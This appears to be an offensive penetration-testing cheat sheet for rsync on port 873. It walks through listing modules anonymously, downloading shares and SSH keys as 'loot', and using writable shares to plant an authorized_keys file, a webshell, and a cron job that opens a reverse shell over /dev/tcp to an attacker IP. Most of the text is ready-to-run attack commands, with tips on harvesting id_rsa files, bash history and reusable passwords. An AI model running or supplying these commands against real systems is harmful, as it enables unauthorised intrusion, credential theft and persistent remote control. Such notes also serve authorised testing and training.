## Goal
List modules and pull/push files anonymously. Rsync(873) exposes readable shares (source, backups, keys) or writable ones for a shell.

**Checklist**
- [ ] modules listed anonymously?
- [ ] readable share with useful files?
- [ ] writable share? (webroot / .ssh / cron)

# Commands

### Step 1: List modules + browse
```bash
nc $IP 873                              # banner shows @RSYNCD
rsync --list-only rsync://$IP/          # list modules (conf, www, home, backup...)
rsync --list-only rsync://$IP/<module>/
rsync -av --list-only rsync://$IP/<module>/    # recursive listing
```

### Step 2: Download
```bash
rsync -av rsync://$IP/<module>/ ./loot/               # whole share
rsync -av rsync://$IP/<module>/etc/passwd ./          # specific file
```

### Step 3: Upload (if writable)
```bash
rsync -av ~/.ssh/authorized_keys rsync://$IP/<module>/home/<user>/.ssh/   # ssh key
rsync -av shell.php rsync://$IP/<module>/var/www/html/                    # webshell
# cron root shell:
echo '* * * * * root bash -c "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1"' > cron_shell
rsync -av cron_shell rsync://$IP/<module>/etc/cron.d/
```

### Step 4: Auth (if required)
```bash
rsync -av rsync://user@$IP/<module>/ ./loot/     # prompts for pass (reuse found creds)
```

### Helpline
```bash
# READING MODULE LIST: modules list with no auth = anonymous access -> download everything, test writability.
#   "@ERROR: auth failed" = creds required -> try creds from other services (rsync rsync://user@$IP/module).
# WHAT MODULE NAMES MEAN: conf -> config files (grep for passwords). www/html -> web root (upload a webshell
#   if writable). home -> user dirs (grab .ssh/id_rsa, .bash_history).
# TESTING WRITE: rsync -av a test file up; success -> you can plant files.
# WRITE + a known path -> RCE:
#   authorized_keys into a user's .ssh, OR a webshell into the web root, OR a cron file into /etc/cron.d/.
# a module mapping to / or a home is the jackpot — read id_rsa and config files first.
```
